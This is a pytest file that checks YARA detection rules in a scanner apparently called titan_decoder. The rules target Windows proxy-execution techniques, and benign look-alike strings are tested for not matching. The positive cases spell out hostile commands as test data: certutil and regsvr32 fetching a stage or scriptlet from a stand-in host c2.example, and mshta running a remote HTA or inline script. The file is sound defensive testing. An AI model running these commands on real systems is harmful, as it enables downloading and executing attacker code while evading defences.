"""Precision checks for the shipped starter YARA detection content."""

from pathlib import Path

import pytest

from titan_decoder.core.yara_scanner import YaraScanner

pytest.importorskip("yara")

RULES = Path(__file__).parents[1] / "examples" / "yara_rules"


@pytest.mark.parametrize(
    ("payload", "expected_rule", "attack_id"),
    [
        (
            b"certutil.exe -urlcache -split -f https://c2.example/stage.bin out.bin",
            "Titan_Certutil_Remote_Download",
            "T1105",
        ),
        (
            b"mshta.exe https://c2.example/launch.hta",
            "Titan_MSHTA_Remote_Execution",
            "T1218.005",
        ),
        (
            b"mshta javascript:close(new ActiveXObject('WScript.Shell').Run('calc'))",
            "Titan_MSHTA_Remote_Execution",
            "T1218.005",
        ),
        (
            b"regsvr32 /s /n /u /i:https://c2.example/payload.sct scrobj.dll",
            "Titan_Regsvr32_Remote_Scriptlet",
            "T1218.010",
        ),
    ],
)
def test_starter_pack_detects_proxy_execution_chains(
    payload, expected_rule, attack_id
):
    result = YaraScanner(
        {"enable_yara": True, "yara_rules_dirs": [str(RULES)]}
    ).scan([(0, payload)])

    matches = {match["rule"]: match for match in result["matches"]}
    assert expected_rule in matches
    assert matches[expected_rule]["severity"] == "high"
    assert matches[expected_rule]["meta"]["attack_id"] == attack_id


@pytest.mark.parametrize(
    "payload",
    [
        b"Run certutil -hashfile package.zip SHA256 to verify the release.",
        b"The administrator opened a local help.hta file with mshta.exe.",
        b"regsvr32 /s local-component.dll",
        b"Documentation: certutil and mshta can access https://docs.example/ safely.",
        b"The scrobj.dll component is registered by Windows; do not delete it.",
    ],
)
def test_starter_pack_rejects_benign_proxy_execution_near_misses(payload):
    result = YaraScanner(
        {"enable_yara": True, "yara_rules_dirs": [str(RULES)]}
    ).scan([(0, payload)])

    new_rules = {
        "Titan_Certutil_Remote_Download",
        "Titan_MSHTA_Remote_Execution",
        "Titan_Regsvr32_Remote_Scriptlet",
    }
    assert not (new_rules & {match["rule"] for match in result["matches"]})
